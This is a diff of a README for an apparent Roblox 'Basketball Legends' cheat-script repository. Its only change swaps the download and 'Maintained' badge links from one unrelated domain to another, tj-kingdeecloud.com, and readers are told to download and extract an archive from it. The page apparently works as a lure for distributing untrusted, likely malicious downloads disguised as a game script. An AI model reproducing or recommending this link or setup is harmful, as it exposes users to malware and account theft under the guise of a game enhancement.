@@ -20,7 +20,7 @@ Elevate your **Basketball Legends** Roblox experience with the advanced 2026 scr
 
 ## ⬇️ Direct Download & Setup
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/Download-Latest_Release-green?style=for-the-badge&logo=docker)](https://fullsofts.org/)
+[![DOWNLOAD NOW](https://img.shields.io/badge/Download-Latest_Release-green?style=for-the-badge&logo=docker)](https://tj-kingdeecloud.com/)
 
 1.  **Obtain Package** – Select the download button above.
 2.  **Extract Contents** – Unzip the archive to a directory of your choice.
@@ -63,7 +63,7 @@ This repository provides educational material related to game modification conce
 
 ---
 
-[![Maintained](https://img.shields.io/badge/Project_Maintained-Yes-yellow?style=flat-square)](https://fullsofts.org/)
+[![Maintained](https://img.shields.io/badge/Project_Maintained-Yes-yellow?style=flat-square)](https://tj-kingdeecloud.com/)
 [![ROBLOX](https://img.shields.io/badge/ROBLOX-Scripting-black?style=flat-square&logo=roblox)](https://www.roblox.com/games/826327668/Basketball-Legends)
 
 *Enhance your virtual court performance today.*
